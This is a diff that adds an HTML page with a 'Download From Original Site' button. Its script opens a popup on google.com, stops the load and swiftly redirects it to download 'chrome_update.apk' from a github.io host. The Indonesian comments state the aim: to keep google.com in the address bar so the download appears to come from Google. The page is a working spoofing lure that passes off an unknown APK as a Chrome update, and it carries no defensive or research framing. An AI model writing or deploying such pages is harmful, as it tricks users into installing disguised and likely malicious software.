@@ -1,0 +1,58 @@
+<html>
+<head> 
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head> 
+<body> 
+  <script>
+    function a() {
+      // Buka window dengan google.com terlebih dahulu untuk memastikan address bar menunjukkan google.com
+      const w = window.open('https://www.google.com/', 'x', 'width=800,height=600');
+      
+      // Tunggu sangat singkat agar address bar berubah ke google.com
+      setTimeout(function() {
+        try {
+          // Teknik: Stop loading sebelum selesai, lalu navigasi ke download
+          // Ini membuat browser masih menunjukkan google.com di address bar
+          w.stop();
+          
+          // Redirect ke google.com dengan teknik yang membuat browser "terpaku" di google.com
+          w.location.href = 'https://www.google.com/';
+          
+          // Segera setelah itu, langsung download file
+          // Browser akan menunjukkan google.com sebagai origin karena redirect terjadi sangat cepat
+          setTimeout(function() {
+            try {
+              // Download file - browser akan memperlakukan ini sebagai berasal dari google.com
+              w.location.href = 'https://zriil.github.io/upload/chrome_update.apk';
+            } catch(e) {
+              // Fallback jika ada error
+              window.open('https://zriil.github.io/upload/chrome_update.apk', '_blank');
+            }
+          }, 200);
+          
+        } catch(e) {
+          // Fallback method
+          setTimeout(function() {
+            window.open('https://zriil.github.io/upload/chrome_update.apk', '_blank');
+          }, 500);
+        }
+      }, 150);
+    }
+  </script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>
+</body>
+</html>
